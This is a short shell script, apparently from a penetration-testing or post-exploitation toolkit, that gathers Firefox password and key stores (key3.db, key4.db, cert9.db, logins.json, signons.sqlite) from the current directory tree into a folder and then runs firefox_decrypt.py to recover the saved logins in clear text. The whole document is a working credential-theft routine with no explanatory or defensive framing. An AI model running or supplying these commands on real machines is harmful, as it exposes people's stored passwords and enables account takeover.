mkdir firefox_creds

find . -name "key3.db" -exec cp {} firefox_creds/ \;
find . -name "key4.db" -exec cp {} firefox_creds/ \;
find . -name "cert9.db" -exec cp {} firefox_creds/ \;
find . -name "logins.json" -exec cp {} firefox_creds/ \;
find . -name "signons.sqlite" -exec cp {} firefox_creds/ \;

ls firefox_creds -hAl

/opt/firefox_decrypt/firefox_decrypt.py firefox_creds/

